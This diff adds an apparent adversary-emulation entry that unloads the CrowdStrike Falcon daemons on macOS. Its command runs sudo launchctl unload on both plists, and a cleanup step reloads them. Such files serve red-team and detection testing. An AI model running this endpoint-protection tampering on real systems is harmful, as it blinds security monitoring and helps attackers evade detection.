@@ -1,0 +1,19 @@
+---
+- id: 8b5fb5a437fad691a2764514f0c022ee
+  name: Stop and unload Crowdstrike Falcon on macOS
+  description: 'Stop and unload Crowdstrike Falcon daemons falcond and userdaemon
+    on macOS
+
+    '
+  tactic: defense-impairment
+  technique:
+    attack_id: T1685
+    name: Disable or Modify Tools
+  platforms:
+    darwin:
+      sh:
+        command: sudo launchctl unload /Library/LaunchDaemons/com.crowdstrike.falcond.plist;
+          sudo launchctl unload /Library/LaunchDaemons/com.crowdstrike.userdaemon.plist
+        payloads: []
+        cleanup: sudo launchctl load -w /Library/LaunchDaemons/com.crowdstrike.falcond.plist;
+          sudo launchctl load -w /Library/LaunchDaemons/com.crowdstrike.userdaemon.plist
